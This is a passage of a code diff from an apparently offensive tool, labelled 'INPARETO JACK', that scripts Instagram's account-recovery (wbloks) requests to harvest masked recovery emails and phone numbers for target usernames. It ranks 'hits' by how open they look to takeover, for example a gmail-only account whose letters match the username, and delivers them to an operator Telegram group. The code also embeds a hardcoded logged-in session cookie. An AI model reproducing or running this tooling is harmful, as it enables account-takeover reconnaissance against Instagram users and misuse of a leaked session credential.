+    _hit_tg_rate_wait()
+    delivered, new_id, new_photo = deliver_hit_to_operator_group(
+        caption, hit_keyboard, photo_bytes, content_type,
+    )
+    return delivered, new_id, new_photo, "new" if delivered else "fail"
+
+
+def _deliver_hit_instant_stub(username, info, contact_details=None):
+    """Rate-limited stub instant post — full caption comes on enrich edit."""
+    if not TELEGRAM_ENABLED or not get_operator_hit_group_id():
+        return False, None, False
+    caption, keyboard, photo_bytes, content_type, _, _, _, _ = _compose_hit_instant_stub_message(
+        username, info, contact_details,
+    )
+    _hit_tg_rate_wait()
+    delivered, msg_id, is_photo = deliver_hit_to_operator_group(
+        caption, keyboard, photo_bytes, content_type,
+    )
+    if not delivered:
+        _enqueue_hit_tg_retry(username, caption, keyboard, photo_bytes, content_type)
+        log_event("HIT RETRY", f"@{username} instant queued for TG retry")
+    return delivered, msg_id, is_photo
+
+
+def _hit_instant_group_alert(username, info):
+    """Fire hit to the linked group immediately — do not wait for enrich."""
+    if not TELEGRAM_ENABLED:
+        return
+    gid = get_operator_hit_group_id()
+    if not gid:
+        log_event("HIT FAIL", f"@{username} no hit group — link via /verifyhitgroup")
+        return
+    info = _merge_ig_info_profile_fields(dict(info or {}), username)
+    contact_details = _hit_contact_seed_from_info(info)
+    delivered, msg_id, is_photo = _deliver_hit_instant_stub(username, info, contact_details)
+    if delivered and msg_id:
+        _hit_tg_cache_put(username, gid, msg_id, is_photo)
+        log_event("HIT TG", f"@{username} instant · group")
+    elif not delivered:
+        log_event("HIT FAIL", f"@{username} instant send failed — retry queue")
+
+
+def _queue_hit_instant_tg(username, info):
+    try:
+        _hit_tg_delivery_executor.submit(
+            _hit_instant_group_alert, username, dict(info or {}),
+        )
+    except Exception as exc:
+        log_event("HIT BG", f"@{username} instant TG queue {str(exc)[:60]}")
+        _hit_instant_group_alert(username, info)
+
+
+def _schedule_hit_tg_deliver(username, info, contact_details, profile_url, timestamp):
+    """Enqueue enrich edit on TG pool — waits for instant cache, no photo re-send."""
+    payload = (
+        username,
+        dict(info or {}),
+        dict(contact_details or {}),
+        profile_url,
+        timestamp,
+    )
+
+    def _run():
+        if not _wait_hit_tg_cache(username, 20.0):
+            log_event("HIT TG", f"@{username} instant cache timeout")
+        with _hit_tg_user_lock(username):
+            _hit_deliver_and_archive(*payload)
+
+    try:
+        _hit_tg_delivery_executor.submit(_run)
+    except Exception as exc:
+        log_event("HIT BG", f"@{username} TG deliver queue {str(exc)[:60]}")
+        _run()
+
+
+def _queue_hit_tg_chain(username, info):
+    """Instant send then enrich upgrade — serialized per username on TG pool."""
+    info_copy = dict(info or {})
+
+    def _start():
+        with _hit_tg_user_lock(username):
+            _hit_instant_group_alert(username, info_copy)
+        _queue_hit_upgrade_pipeline(username, info_copy)
+
+    try:
+        _hit_tg_delivery_executor.submit(_start)
+    except Exception as exc:
+        log_event("HIT BG", f"@{username} TG chain {str(exc)[:60]}")
+        _start()
+
+
+def _deliver_hit_group_guaranteed(username, info, contact_details=None):
+    """Rate-limited group delivery with automatic retry queue on failure."""
+    if not TELEGRAM_ENABLED or not get_operator_hit_group_id():
+        return False, None, False
+    caption, keyboard, photo_bytes, content_type, _, _, _, _ = _compose_hit_group_message(
+        username, info, contact_details,
+    )
+    _hit_tg_rate_wait()
+    delivered, msg_id, is_photo = deliver_hit_to_operator_group(
+        caption, keyboard, photo_bytes, content_type,
+    )
+    if not delivered:
+        _enqueue_hit_tg_retry(username, caption, keyboard, photo_bytes, content_type)
+        log_event("HIT RETRY", f"@{username} queued for TG retry")
+    return delivered, msg_id, is_photo
+
+
+def submit_hit_report(username, info):
+    """Bounded hit-report queue — avoids unbounded thread pile-up."""
+    try:
+        _hit_report_executor.submit(report, username, info)
+    except Exception as exc:
+        log_event("HIT REPORT", f"@{username} queue failed {str(exc)[:60]}")
+
+
+def _ensure_hits_dir():
+    os.makedirs(HITS_DIR, exist_ok=True)
+
+
+def _session_hits_basename(start=None):
+    st = start or START_TIME
+    return f"session_{st.strftime('%Y%m%d_%H%M%S')}.txt"
+
+
+def _init_session_hits_file():
+    """One basic hits file per session under hits/."""
+    global _session_hits_file
+    _ensure_hits_dir()
+    _session_hits_file = os.path.join(HITS_DIR, _session_hits_basename())
+    if os.path.exists(_session_hits_file):
+        return _session_hits_file
+    started = START_TIME.strftime("%d %b %Y %H:%M:%S UTC")
+    with _hits_file_lock:
+        with open(_session_hits_file, "w", encoding="utf-8") as f:
+            f.write(f"# INPARETO JACK — session {started}\n")
+            f.write("# username | followers | following\n")
+            f.write("-" * 48 + "\n")
+    return _session_hits_file
+
+
+def _current_session_hits_path():
+    if _session_hits_file and os.path.isfile(_session_hits_file):
+        return _session_hits_file
+    path = os.path.join(HITS_DIR, _session_hits_basename())
+    return path if os.path.isfile(path) else None
+
+
+def _write_hit_session_basic(username, info):
+    """Instant basic log — username, followers, following only (no enrich)."""
+    info = _merge_ig_info_profile_fields(dict(info or {}), username)
+    uname = (username or "").strip().lstrip("@")
+    if not uname:
+        return
+    followers = info.get("follower_count", "N/A")
+    following = info.get("following_count", "N/A")
+    if not _session_hits_file:
+        _init_session_hits_file()
+    line = f"{uname}\t{followers}\t{following}\n"
+    with _hits_file_lock:
+        with open(_session_hits_file, "a", encoding="utf-8") as f:
+            f.write(line)
+
+
+def _write_hit_file_entry(
+    username,
+    name,
+    followers,
+    following,
+    posts_display,
+    quality_display,
+    contact_details,
+    profile_url,
+    timestamp,
+):
+    with _hits_file_lock:
+        with open("hits.txt", "a", encoding="utf-8") as f:
+            f.write("╔" + "═" * 60 + "╗\n")
+            f.write(f"Username    : {username}\n")
+            f.write(f"Full Name   : {name}\n")
+            f.write(f"Followers   : {followers}\n")
+            f.write(f"Following   : {following}\n")
+            f.write(f"Posts       : {posts_display}\n")
+            f.write(f"Hit Quality : {quality_display}\n")
+            if contact_details.get("joined"):
+                f.write(f"Joined      : {contact_details['joined']}\n")
+            if contact_details.get("email"):
+                f.write(f"Email       : {contact_details['email']}\n")
+            if contact_details.get("phone"):
+                f.write(f"Phone       : {contact_details['phone']}\n")
+            f.write(f"Profile URL : {profile_url}\n")
+            f.write(f"Found At    : {timestamp}\n")
+            f.write("╚" + "═" * 60 + "╝\n")
+
+
+def _hit_quality_meter(star_count):
+    """Classic meter: filled ★, empty ☆ (e.g. 3/5 → ★★★☆☆)."""
+    n = max(1, min(5, int(star_count or 1)))
+    return "★" * n + "☆" * (5 - n)
+
+
+def _format_hit_quality_display(star_count):
+    """Plain text — hits.txt, terminal log."""
+    n = max(1, min(5, int(star_count or 1)))
+    return f"{n}/5  {_hit_quality_meter(n)}"
+
+
+def _format_hit_quality_telegram(star_count):
+    """Telegram HTML — score in <code>, unicode meter outside (Android-safe)."""
+    n = max(1, min(5, int(star_count or 1)))
+    return (
+        f"  {S['bullet']} Hit Quality  <code>{n}/5</code>  {_hit_quality_meter(n)}\n"
+    )
+
+
+def _masked_email_is_gmail(masked_email):
+    """Reset match requires @gmail.com — rejects aol/yahoo/etc."""
+    v = (masked_email or "").strip().lower()
+    if not v or "@" not in v:
+        return False
+    if _HIT_FULL_GMAIL_RE.match(v):
+        return True
+    return bool(_HIT_MASKED_GMAIL_RE.search(v))
+
+
+def _visible_email_local_ends(masked_email):
+    local = (masked_email or "").split("@")[0].strip()
+    if not local:
+        return "", ""
+    first = last = ""
+    for ch in local:
+        if ch not in "*•":
+            first = ch.lower()
+            break
+    for ch in reversed(local):
+        if ch not in "*•":
+            last = ch.lower()
+            break
+    return first, last
+
+
+def _username_email_letters_match(username, masked_email):
+    """Reset match: gmail.com domain + first/last visible local letters vs username."""
+    if not _masked_email_is_gmail(masked_email):
+        return False
+    uname = (username or "").strip().lstrip("@").lower()
+    if len(uname) < 2:
+        return False
+    first_e, last_e = _visible_email_local_ends(masked_email)
+    if not first_e or not last_e:
+        return False
+    return uname[0] == first_e and uname[-1] == last_e
+
+
+def _calculate_hit_quality_stars(username, name, followers, posts_raw, contact_details):
+    """
+    Hit quality (max 5☆):
+    +1 base · +1 if 50+ followers · +1 if 20+ posts · +1 if 2+ word name
+    +1 if email only (no phone)
+    Cap at 1☆ if phone linked OR reset match fails (gmail.com + letter match).
+    """
+    details = contact_details or {}
+    phone = (details.get("phone") or "").strip()
+    email = (details.get("email") or "").strip()
+
+    if phone:
+        return 1
+    if email and not _username_email_letters_match(username, email):
+        return 1
+
+    stars = 1
+    try:
+        if int(followers) >= 50:
+            stars += 1
+    except (TypeError, ValueError):
+        pass
+    try:
+        if posts_raw is not None and int(posts_raw) >= 20:
+            stars += 1
+    except (TypeError, ValueError):
+        pass
+    if len([w for w in re.split(r"\s+", (name or "").strip()) if w]) >= 2:
+        stars += 1
+    if email:
+        stars += 1
+    return min(stars, 5)
+
+
+def _build_hit_caption_base(
+    username_safe,
+    name_safe,
+    followers_safe,
+    following_safe,
+    posts_safe,
+    timestamp,
+    profile_url,
+    quality_stars,
+):
+    return (
+        format_panel_header()
+        + f"<b>{S['brand']} New Capture</b>\n\n"
+        + f"  {S['bullet']} User      <tg-spoiler>@{username_safe}</tg-spoiler>\n"
+        + f"  {S['bullet']} Name      {name_safe}\n"
+        + tg_row("Followers", followers_safe)
+        + tg_row("Following", following_safe)
+        + tg_row("Posts", posts_safe)
+        + _format_hit_quality_telegram(quality_stars)
+        + tg_row("Found", timestamp)
+        + f"\n<a href=\"{profile_url}\">{S['btn_profile']} Open on Instagram</a>"
+    )
+
+
+def _pick_ig_contact_points(points):
+    email = phone = ""
+    for cp in _filter_valid_contact_points(points):
+        kind = (cp.get("type") or "").upper()
+        val = (cp.get("contact_point") or "").strip()
+        if kind == "EMAIL" and not email:
+            email = val
+        elif kind == "PHONE" and not phone:
+            phone = val
+    return email, phone
+
+
+def _apply_recovery_result_to_hit_out(out, result):
+    """Merge legacy HitRecoveryResult — IG masked values only, no re-mask."""
+    if not getattr(result, "found", False):
+        return out
+    if not out.get("joined"):
+        ac = (getattr(result, "account_created", None) or "").strip()
+        if ac:
+            out["joined"] = ac
+    email_raw = (getattr(result, "email", None) or "").strip()
+    phone_raw = (getattr(result, "phone", None) or "").strip()
+    cp_email, cp_phone = _pick_ig_contact_points(
+        getattr(result, "contact_points", None) or []
+    )
+    if not email_raw:
+        email_raw = cp_email
+    if not phone_raw:
+        phone_raw = cp_phone
+    if email_raw and _is_valid_ig_recovery_email(email_raw) and not out.get("email"):
+        out["email"] = email_raw
+    if phone_raw and _is_valid_ig_recovery_phone(phone_raw) and not out.get("phone"):
+        out["phone"] = phone_raw
+    return out
+
+
+def _merge_recovery_phone_only(out, result):
+    """Apply only validated phone from a recovery result (keep existing email)."""
+    if not getattr(result, "found", False):
+        return out
+    phone_raw = (getattr(result, "phone", None) or "").strip()
+    _, cp_phone = _pick_ig_contact_points(getattr(result, "contact_points", None) or [])
+    if not phone_raw:
+        phone_raw = cp_phone
+    if phone_raw and _is_valid_ig_recovery_phone(phone_raw):
+        out["phone"] = phone_raw
+    return out
+
+
+
+_WBLOKS_BKV = "487c52f1e99f6fe3faee06af68ac70f38b5a53f74509a278bba9db63a261bc12"
+_WBLOKS_DEVICE_ID = "aZ67dgABAAGBHw-P3_ILGWvl1aRb"
+_WBLOKS_FETCH_URL = "https://www.instagram.com/async/wbloks/fetch/"
+_WBLOKS_USER_AGENT = (
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
+)
+_WBLOKS_USE_LOGGED_IN_SESSION = False
+_WBLOKS_BASE_COOKIES = {
+    "datr": "drueaT-Mec1uOMARZ5giSXbi",
+    "ig_did": "01076FE5-57FB-4B7F-A186-50F2047AEE9C",
+    "mid": "aZ67dgABAAGBHw-P3_ILGWvl1aRb",
+    "ps_l": "1",
+    "ps_n": "1",
+    "dpr": "2.4000000953674316",
+}
+_WBLOKS_LOGGED_IN_COOKIES = {
+    "ds_user_id": "56939731259",
+    "sessionid": (
+        "56939731259%3AzJPg6MVevx6U61%3A0%3A"
+        "AYg9Wj7ogENEcHzHm9Im4Fn569nDlukhSk-MSgKqwxw"
+    ),
+    "rur": (
+        '"CLN\\05456939731259\\0541812871654:01ffc82fb81c546526b7299310cb47d23'
+        "fbb0d178c7bb68ca255ce2fb9ed7489e494dcb4\""
+    ),
+}
+_WBLOKS_STEP1_CONTEXT = (
+    "AdBQTjHuBAMk8-R968o5JMQWYgV4QPZHKf-As029YpJ8rk2nxmXp9psDta8ax-c1Kt_MNvWHOS8NLW3aoxu28q6VXjLb1CD"
+    "-MoY5bO4Vg7ZV_LpppM5Ofm94CXKRqAm981Aq9cBJwMUst2EIV6PRsenxqHdTAOZtg2dAOQVOur_2p3f2S-KncvFHFUVtRTjmIzbHw"
+    "QzGQd3UeN8JTMcoahKE3cZMQu0t8XRx1r_9OUk3x9mSCwKuBJ2YY4MkNCotvnVYvUOJ68SGaCRl9VHRbe1XG7Wv3NqwtLbF-D0982Cgz3evLuQ7D9BL3ncsfDJwYNt_UE2qA1SLLBdxZQ3YeGikksoD5iomy9NM3l9R4o9Ybxmso13v6nofG_L_RYHT4wZ4m1WMYN9cfexavfMwh3oUUd65VYtSlwrYYlOYH6O0ro0UKeQ|arm"
+)
+_WBLOKS_ARM_RE = re.compile(r"Ad[A-Za-z0-9_-]{20,}\|arm")
+_WBLOKS_AUTH_TOKEN_RE = r"Ad[A-Za-z0-9_-]{20,320}"
+_WBLOKS_AUTH_ASYNC_PATTERNS = (
+    rf'\\"phone\\",\s*false,\s*false,\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+    rf'\\"email\\",\s*false,\s*false,\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+    rf'\\"phone\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+    rf'\\"email\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+    rf'\\"password\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+    rf'\\"(?:phone|email|password)\\",\s*(?:true|false),\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+)
+_WBLOKS_MASKED_EMAIL_RE = re.compile(r"[a-zA-Z0-9]\*+[a-zA-Z0-9]@[a-zA-Z0-9\*\.\-]+")
+_WBLOKS_FULL_EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}")
+_WBLOKS_SENT_CODE_EMAIL_RE = re.compile(
+    r"We sent a code to ([a-zA-Z0-9*._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})",
+    re.IGNORECASE,
+)
+_WBLOKS_MASKED_PHONE_RE = re.compile(r"\+\d{1,3}(?:\s+[\*]+\s*)+\d{2,4}")
+_WBLOKS_AUTH_METHOD_APPID = "com.bloks.www.caa.ar.auth_method"
+_WBLOKS_EMAIL_CONFIRM_ASYNC_APPID = "com.bloks.www.caa.ar.authentication_confirmation.async"
+_WBLOKS_INITIATE_VIEW_APPID = "com.bloks.www.caa.ar.initiate_view"
+_WBLOKS_SEARCH_APPID = "com.bloks.www.caa.ar.search.async"
+_WBLOKS_AUTH_METHOD_ASYNC_APPID = "com.bloks.www.caa.ar.auth_method.async"
+_WBLOKS_STEP2_ROUTE_RE = re.compile(
+    r'app_id\\",\s*\\"(com\.bloks\.www\.caa\.ar\.(?:auth_method|authentication_confirmation))\\"'
+    r',\s*\\"tti_marker_id\\",\s*\d+,\s*\\"screen_id\\",\s*\\"([^\\]+)\\"'
+)
+_WBLOKS_STEP4_ROUTE_RE = re.compile(
+    r'app_id\\",\s*\\"com\.bloks\.www\.caa\.ar\.initiate_view\\"'
+    r',\s*\\"tti_marker_id\\",\s*\d+,\s*\\"screen_id\\",\s*\\"([^\\]+)\\"'
+)
+
+
+def _wbloks_strip_json(text):
+    text = (text or "").strip()
+    if text.startswith("for (;;);"):
+        return text[9:].strip()
+    return text
+
+
+def _wbloks_arm_token(text):
+    body = _wbloks_strip_json(text)
+    m = _WBLOKS_ARM_RE.search(body) if body else None
+    return m.group(0) if m else None
+
+
+def _wbloks_auth_tokens(body, method):
+    tokens = []
+    for pattern in (
+        rf'\\"{method}\\",\s*false,\s*false,\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+        rf'\\"{method}\\",\s*(?:true|false),\s*\\"({_WBLOKS_AUTH_TOKEN_RE})\\"',
+    ):
+        for match in re.finditer(pattern, body):
+            token = match.group(1)
+            if "|arm" not in token:
+                tokens.append(token)
+    return tokens
+
+
+def _wbloks_auth_async_params(text):
+    body = _wbloks_strip_json(text)
+    if not body:
+        return None
+    for pattern in _WBLOKS_AUTH_ASYNC_PATTERNS:
+        match = re.search(pattern, body)
+        if match and "|arm" not in match.group(1):
+            return match.group(1)
+    return None
+
+
+def _wbloks_auth_options(text):
+    body = _wbloks_strip_json(text)
+    if not body:
+        return []
+    options = []
+    for method in ("email", "phone", "password"):
+        tokens = _wbloks_auth_tokens(body, method)
+        if tokens:
+            options.append((method, min(tokens, key=len)))
+    return options
+
+
+def _wbloks_pick_step3(options, response_text=""):
+    methods = {m: t for m, t in options}
+    if "phone" in methods:
+        return "phone", methods["phone"], "1"
+    if "email" in methods:
+        return "email", methods["email"], "0"
+    body = _wbloks_strip_json(response_text)
+    if _wbloks_masked_phone(response_text) or "mobile number" in body.lower():
+        token = _wbloks_auth_async_params(response_text)
+        if token:
+            return "phone", token, "1"
+    if "password" in methods:
+        return "password", methods["password"], "0"
+    return "phone", "", "1"
+
+
+def _wbloks_step2_route(text):
+    body = _wbloks_strip_json(text)
+    m = _WBLOKS_STEP2_ROUTE_RE.search(body or "")
+    if m:
+        return m.group(1), m.group(2)
+    return _WBLOKS_AUTH_METHOD_APPID, "19q6u5:2"
+
+
+def _wbloks_qpl_instance(text, anchor="authentication_confirmation.async"):
+    body = _wbloks_strip_json(text)
+    pos = body.find(anchor)
+    if pos < 0:
+        return None
+    m = re.search(r"i64\.Const,\s*(\d+)", body[pos : pos + 12000])
+    return m.group(1) if m else None
+
+
+def _wbloks_step4_screen(text):
+    body = _wbloks_strip_json(text)
+    m = _WBLOKS_STEP4_ROUTE_RE.search(body or "")
+    return m.group(1) if m else None
+
+
+def _wbloks_visible_texts(text):
+    body = _wbloks_strip_json(text)
+    if not body:
+        return []
+    seen, visible = set(), []
+    for raw in re.findall(r'"text":"((?:\\.|[^"\\])*)"', body):
+        item = raw
+        if "\\u" in item:
+            try:
+                item = bytes(item, "utf-8").decode("unicode_escape")
+            except UnicodeDecodeError:
+                pass
+        item = item.replace("\\u0040", "@").strip()
+        if not item or item in seen or item.startswith("(bk."):
+            continue
+        seen.add(item)
+        visible.append(item)
+    return visible
+
+
+def _wbloks_masked_email(text):
+    body = _wbloks_strip_json(text).replace("\\u0040", "@")
+    if not body:
+        return None
+    sent = _WBLOKS_SENT_CODE_EMAIL_RE.search(body)
+    if sent:
+        return sent.group(1).rstrip(".,;:!? ")
+    m = _WBLOKS_MASKED_EMAIL_RE.search(body)
+    if m:
+        return m.group(0).rstrip(".,;:!? ")
+    for item in _wbloks_visible_texts(text):
+        sent = _WBLOKS_SENT_CODE_EMAIL_RE.search(item)
+        if sent:
+            return sent.group(1).rstrip(".,;:!? ")
+        emb = _WBLOKS_MASKED_EMAIL_RE.search(item)
+        if emb:
+            return emb.group(0).rstrip(".,;:!? ")
+        if "*" in item and "@" in item:
+            return item.rstrip(".,;:!? ")
+        if _WBLOKS_FULL_EMAIL_RE.fullmatch(item.strip()):
+            return item.strip()
+    return None
+
+
+def _wbloks_masked_phone(text):
+    body = _wbloks_strip_json(text)
+    if not body:
+        return None
+    m = _WBLOKS_MASKED_PHONE_RE.search(body)
+    if m:
+        return m.group(0)
+    for item in _wbloks_visible_texts(text):
+        if item.startswith("+") and "*" in item:
+            return item
+    return None
+
+
+def _wbloks_jazoest(fb_dtsg):
+    return str(2 + sum(ord(c) for c in fb_dtsg))
+
+
+def _wbloks_bootstrap_pull(use_logged_in, proxies=None):
+    sess = requests.Session()
+    cookies = _WBLOKS_BASE_COOKIES.copy()
+    if use_logged_in:
+        cookies.update(_WBLOKS_LOGGED_IN_COOKIES)
+    sess.cookies.update(cookies)
+    resp = sess.get(
+        _HIT_RECOVERY_RESET_URL,
+        headers={"user-agent": _WBLOKS_USER_AGENT, "accept-language": "en-US"},
+        timeout=20,
+        proxies=proxies,
+    )
+    html = resp.text or ""
+    lsd = (re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html) or [None, ""])[1]
+    fb_dtsg = (re.search(r'"dtsg":\{"token":"([^"]+)"', html) or [None, ""])[1]
+    rev = (re.search(r'"client_revision":(\d+)', html) or [None, ""])[1]
+    hsi = (re.search(r'"hsi":"(\d+)"', html) or [None, ""])[1]
+    spin_t = (re.search(r'"__spin_t":(\d+)', html) or [None, ""])[1]
+    merged = cookies.copy()
+    merged.update(requests.utils.dict_from_cookiejar(sess.cookies))
+    return {
+        "cookies": merged,
+        "lsd": (lsd or "").strip(),
+        "fb_dtsg": (fb_dtsg or "").strip(),
+        "jazoest": _wbloks_jazoest(fb_dtsg) if fb_dtsg else "",
+        "__rev": rev,
+        "__spin_r": rev,
+        "__hsi": hsi,
+        "__spin_t": spin_t,
+        "status_code": resp.status_code,
+        "used_logged_in": use_logged_in,
+    }
+
+
+def _wbloks_bootstrap(proxies=None):
+    boot = _wbloks_bootstrap_pull(_WBLOKS_USE_LOGGED_IN_SESSION, proxies)
+    if (not boot["lsd"] or not boot["fb_dtsg"]) and _WBLOKS_USE_LOGGED_IN_SESSION:
+        boot = _wbloks_bootstrap_pull(False, proxies)
+        boot["fallback_logged_out"] = True
+    if boot.get("status_code") == 429:
+        boot["rate_limited"] = True
+    return boot
+
+
+def _wbloks_apply_tokens(data, boot):
+    for key in ("fb_dtsg", "lsd", "jazoest", "__rev", "__spin_r", "__hsi", "__spin_t"):
+        value = boot.get(key)
+        if value:
+            data[key] = value
+
+
+def _wbloks_headers(boot):
+    return {
+        "accept": "*/*",
+        "accept-language": "en-US",
+        "cache-control": "no-cache",
+        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+        "origin": "https://www.instagram.com",
+        "pragma": "no-cache",
+        "priority": "u=1, i",
+        "referer": _HIT_RECOVERY_RESET_URL,
+        "sec-ch-prefers-color-scheme": "dark",
+        "sec-ch-ua": (
+            '"Chromium";v="127", "Not)A;Brand";v="99", '
+            '"Microsoft Edge Simulate";v="127", "Lemur";v="127"'
+        ),
+        "sec-ch-ua-full-version-list": (
+            '"Chromium";v="127.0.6533.144", "Not)A;Brand";v="99.0.0.0", '
+            '"Microsoft Edge Simulate";v="127.0.6533.144", "Lemur";v="127.0.6533.144"'
+        ),
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-model": '"V2249"',
+        "sec-ch-ua-platform": '"Android"',
+        "sec-ch-ua-platform-version": '"15.0.0"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": _WBLOKS_USER_AGENT,
+        "x-fb-lsd": boot["lsd"],
+    }
+
+
+def _wbloks_form_data(boot, req_id, params_json, *, step=2):
+    step_s = "1sndd2:lncbw1:xx4sk7" if step == 1 else "xndytq:2om9fa:zax0fu"
+    step_hsi = "7650768943143544687" if step == 1 else "7650778362067551766"
+    data = {
+        "__d": "www",
+        "__user": "0",
+        "__a": "1",
+        "__req": req_id,
+        "__hs": "20617.HYP:instagram_web_pkg.2.1...0",
+        "dpr": "3",
+        "__ccg": "GOOD",
+        "__rev": boot.get("__rev", "1041417520"),
+        "__s": step_s,
+        "__hsi": boot.get("__hsi", step_hsi),
+        "__dyn": (
+            "7xeUjG1mwt8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwGwQwoEcE7O2l0"
+            "Fwqo31w9O0H8jwae4UaEW2G0AEco5G0zK5o4q0HU1IEGdwtU662O0Lo6-3u2WE15E6O1FwlAcwnJ6goK1s"
+            "AwHxW1ow8q0EoK9x60ma1XwqU1eUdo"
+        ),
+        "__csr": (
+            "hA4Ivf92fnlEDTnlvt7p5mRF_P39bj-KFD-UK9BHC-jIxHFoGj8UXx2ch4Upxi6Zx62OE-8aGVAhUSfByqgZ16qaAUlF6"
+            "CByFUZ4UC8z9byrzEsyE8qwsU4Nxu5Ea98K3eEkDy9E4a9-mU4K3y4oO2K4Elwlo6iE3KxC5E05q602DK00ReXyU3Mw0Lva04Gqz"
+            "U0yK0cAy43G0L81EFnw7eohDS09Ag1ySEjglO0YDo0hzzo5p00h4E0Ny03qS0eiCg"
+        ),
+        "__hsdp": "gN2sAehsWpwidhk8Bm4O1-Q9wC-1NwaiEc84O06wFo04m605PU9U1eE0lNg12o",
+        "__hblp": (
+            "0hU1_awMzE4C0SUhwRwd63a3C0OE6W0kK3C1WwrU1fE0Jy0z808WqU14U1gE1Vo1vodU3Lw3ao9U1eKq0cvw4Jw4qg2Bzo5m1Qw9u0vzw"
+        ),
+        "__sjsp": "gN2sAehsWpwidh7d55m4O1-Q9wC-1NwaiEc8",
+        "__comet_req": "7",
+        "fb_dtsg": boot.get("fb_dtsg", ""),
+        "jazoest": boot.get("jazoest", ""),
+        "lsd": boot.get("lsd", ""),
+        "__spin_r": boot.get("__spin_r", "1041417520"),
+        "__spin_b": "trunk",
+        "__spin_t": boot.get("__spin_t", "1781335650"),
+        "__crn": "comet.igweb.PolarisWebBloksAccountRecoveryRoute",
+        "params": params_json,
+    }
+    return data
+
+
+def _wbloks_post(boot, *, appid, req_type, params_json, req_id, wd, step=2, proxies=None):
+    return _wbloks_http.post(
+        _WBLOKS_FETCH_URL,
+        params={"appid": appid, "type": req_type, "__bkv": _WBLOKS_BKV},
+        cookies={**boot["cookies"], "wd": wd},
+        headers=_wbloks_headers(boot),
+        data=_wbloks_form_data(boot, req_id, params_json, step=step),
+        timeout=30,
+        proxies=proxies,
+    )
+
+
+def _wbloks_step1_params(username):
+    return (
+        '{"params":"{\\"server_params\\":{\\"event_request_id\\":\\"5c2d5ee9-f0f2-4c44-8e89-612a38e875b2\\",'
+        '\\"INTERNAL__latency_qpl_marker_id\\":36707139,\\"INTERNAL__latency_qpl_instance_id\\":\\"217380720300109\\",'
+        f'\\"device_id\\":\\"{_WBLOKS_DEVICE_ID}\\",\\"family_device_id\\":null,\\"waterfall_id\\":null,'
+        '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
+        '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
+        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"unknown\\",'
+        f'\\"context_data\\":\\"{_WBLOKS_STEP1_CONTEXT}\\",\\"client_input_params\\":{{'
+        '\\"zero_balance_state\\":null,'
+        f'\\"search_query\\":\\"{username}\\",'
+        '\\"fetched_email_list\\":[],\\"fetched_email_token_list\\":{},\\"sso_accounts_auth_data\\":[],'
+        '\\"sfdid\\":\\"\\",\\"text_input_id\\":\\"zy88df:105\\",\\"encrypted_msisdn\\":\\"\\",'
+        '\\"headers_infra_flow_id\\":\\"\\",\\"was_headers_prefill_available\\":0,'
+        '\\"was_headers_prefill_used\\":0,\\"ig_oauth_token\\":[],\\"android_build_type\\":\\"\\",'
+        '\\"is_whatsapp_installed\\":0,\\"device_network_info\\":null,\\"accounts_list\\":[],'
+        '\\"is_oauth_without_permission\\":0,\\"search_screen_type\\":\\"email_or_username\\",'
+        '\\"ig_vetted_device_nonce\\":\\"\\",\\"gms_incoming_call_retriever_eligibility\\":\\"client_not_supported\\",'
+        '\\"auth_secure_device_id\\":\\"\\",\\"blocked_uids\\":[],\\"cloud_trust_token\\":null,'
+        '\\"network_bssid\\":null,\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}}'
+    )
+
+
+def _wbloks_step2_params(context_data, screen_id):
+    return (
+        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
+        + _WBLOKS_DEVICE_ID
+        + '\\",\\"is_platform_login\\":0,\\"is_from_logged_out\\":0,'
+        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+        '\\"login_entry_point\\":\\"account_recovery\\",\\"context_data\\":\\"'
+        + (context_data or "")
+        + '\\",\\"back_nav_action\\":\\"BACK\\",\\"INTERNAL_INFRA_screen_id\\":\\"'
+        + screen_id
+        + '\\"},\\"client_input_params\\":{\\"lois_settings\\":{\\"lois_token\\":\\"\\"},'
+        '\\"zero_balance_state\\":\\"\\",\\"aac\\":\\"\\"}}"}'
+    )
+
+
+def _wbloks_step3_dual_params(context_data, auth_method, rejected, async_params):
+    return (
+        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
+        + _WBLOKS_DEVICE_ID
+        + '\\",\\"auth_method\\":\\"'
+        + auth_method
+        + '\\",\\"is_auth_method_rejected\\":'
+        + rejected
+        + ',\\"auth_method_async_params\\":\\"'
+        + async_params
+        + '\\",\\"context_data\\":\\"'
+        + context_data
+        + '\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,'
+        '\\"INTERNAL__latency_qpl_instance_id\\":\\"7694035200197\\",'
+        '\\"family_device_id\\":null,\\"waterfall_id\\":null,'
+        '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
+        '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
+        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
